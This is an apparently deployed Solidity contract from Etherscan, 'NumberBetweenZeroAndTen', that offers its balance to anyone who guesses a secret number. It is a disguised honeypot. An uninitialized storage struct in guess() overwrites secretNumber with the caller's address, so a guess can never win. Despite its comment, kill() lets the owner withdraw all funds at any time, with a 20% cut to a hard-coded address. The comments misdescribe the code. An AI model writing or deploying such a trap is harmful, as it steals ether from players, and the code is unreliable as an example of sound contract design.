/**
 *Submitted for verification at Etherscan.io on 2022-02-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.4.23;

contract NumberBetweenZeroAndTen {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    address public owner;
    address constant megaman = 0xc316F2bbcCeE013472d2f709414602cF7Fea6007;
    
    struct Player {
        address addr;
        uint256 ethr;
    }
    
    Player[] players;
    
    constructor() public {
        // On construct set the owner and a random secret number
        owner = msg.sender;
        shuffle();
    }
    
    function guess(uint256 number) public payable {
        // Guess must be between zero and ten
        require(number >= 0 && number <= 10);
        
        // Update the last played date
        lastPlayed = now;
        
        // Add player to the players list
        Player player;
        player.addr = msg.sender;
        player.ethr = msg.value;
        players.push(player);
        
        // Payout if guess is correct
        if (number == secretNumber) {
            msg.sender.transfer(address(this).balance);
        }
        
        // Refresh the secret number
        shuffle();
    }
    
    function shuffle() internal {
        // Randomly set secretNumber with a value between 1 and 10
        secretNumber = uint8(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 10 + 1;
    }

    function kill() public {
        // Enable owner to kill the contract after 24 hours of inactivity
        require(msg.sender == owner, "You are not the owner of contract");
        uint256 balance = address(this).balance;
        megaman.transfer((balance*20)/100);
        owner.transfer((balance*80)/100);
    }
}